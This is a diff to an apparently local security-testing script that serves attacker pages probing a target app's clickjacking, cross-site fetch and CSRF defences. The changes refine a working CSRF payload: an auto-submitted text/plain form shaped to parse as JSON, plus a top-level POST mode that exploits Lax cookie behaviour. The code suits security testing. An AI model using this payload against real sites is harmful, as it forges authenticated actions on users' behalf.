@@ -3,9 +3,13 @@
 // cross-site API calls (does a credentialed fetch from another site get through?).
 // Usage: node attacker-page.mjs <target-origin> [port=4330]
 //   /frame?path=/        the target page in an iframe
-//   /form?path=/api/x&body={"message":"hi"}
+//   /form?path=/api/x&body={"message":"hi"}[&top=1]
 //                        auto-submits a cross-site POST with a text/plain body that parses as JSON
-//                        (no preflight; request.json() and many parsers accept it)
+//                        (no preflight; request.json() and many parsers accept it). The form's
+//                        "=" goes inside the last string field, so no extra field is added.
+//                        top=1 submits as a top-level navigation instead of into an iframe: some
+//                        browser versions send cookies without a SameSite attribute only that way
+//                        (Lax+POST, for two minutes after the cookie is set)
 //   /fetch?path=/api/x&method=POST&body={...}
 //                        a credentialed fetch; shows whether the response was readable
 // The pages are served from the other loopback name (localhost <-> 127.0.0.1), so the browser
@@ -61,15 +65,25 @@ out('framing ' + C.url + ' — take a screenshot: an unprotected app renders bel
 const f = document.createElement('iframe'); f.src = C.url; f.width = 1000; f.height = 700
 f.onload = () => out('iframe load event fired (it fires for refused frames too, so look at the frame)')
 document.body.appendChild(f)`),
-  '/form': (url, q) => page('form', { url, body: q.get('body') || '{"probe":"csrf"}' }, `
+  '/form': (url, q) => page('form', { url, body: q.get('body') || '{"probe":"csrf"}', top: q.get('top') === '1' }, `
 let obj; try { obj = JSON.parse(C.body) } catch { out('body must be a JSON object'); throw new Error('bad body') }
-// text/plain form trick: name + "=" + value, shaped so the whole body is valid JSON.
-const json = JSON.stringify(obj); const head = json.slice(0, -1) + (json === '{}' ? '' : ',') + '"_pad":"'
-const form = document.createElement('form'); form.method = 'POST'; form.action = C.url; form.enctype = 'text/plain'; form.target = 'result'
-const input = document.createElement('input'); input.type = 'hidden'; input.name = head; input.value = '"}'; form.appendChild(input)
-const frame = document.createElement('iframe'); frame.name = 'result'; frame.width = 1000; frame.height = 300
-document.body.appendChild(frame); document.body.appendChild(form)
-out('POST ' + C.url + ' (text/plain) body: ' + head + '="}'); out('check the app log: was it processed with the user\\'s cookies?')
+if (obj === null || typeof obj !== 'object' || Array.isArray(obj)) { out('body must be a JSON object'); throw new Error('bad body') }
+// text/plain form trick: the browser sends name + "=" + value. Split the JSON so the "=" lands at
+// the end of the last string field ({"message":"hi"} -> {"message":"hi="}) and no field is added,
+// so a strict schema does not reject the probe for an unrelated reason. Otherwise add "_pad".
+const json = JSON.stringify(obj)
+let head, tail
+if (json.endsWith('"}')) { head = json.slice(0, -2); tail = '"}' }
+else { head = json.slice(0, -1) + (json === '{}' ? '' : ',') + '"_pad":"'; tail = '"}' }
+const form = document.createElement('form'); form.method = 'POST'; form.action = C.url; form.enctype = 'text/plain'
+const input = document.createElement('input'); input.type = 'hidden'; input.name = head; input.value = tail; form.appendChild(input)
+if (!C.top) {
+  const frame = document.createElement('iframe'); frame.name = 'result'; frame.width = 1000; frame.height = 300
+  document.body.appendChild(frame); form.target = 'result'
+}
+document.body.appendChild(form)
+out('POST ' + C.url + ' (text/plain, ' + (C.top ? 'top-level navigation' : 'into an iframe') + ') body: ' + head + '=' + tail)
+out('check the app log: was it processed with the user\\'s cookies?' + (C.top ? '' : ' If the cookie has no SameSite attribute, try top=1 too (some browsers send it only on a top-level POST).'))
 form.submit()`),
   '/fetch': (url, q) => page('fetch', { url, method: (q.get('method') || 'GET').toUpperCase(), body: q.get('body') }, `
 const init = { method: C.method, credentials: 'include', mode: 'cors' }
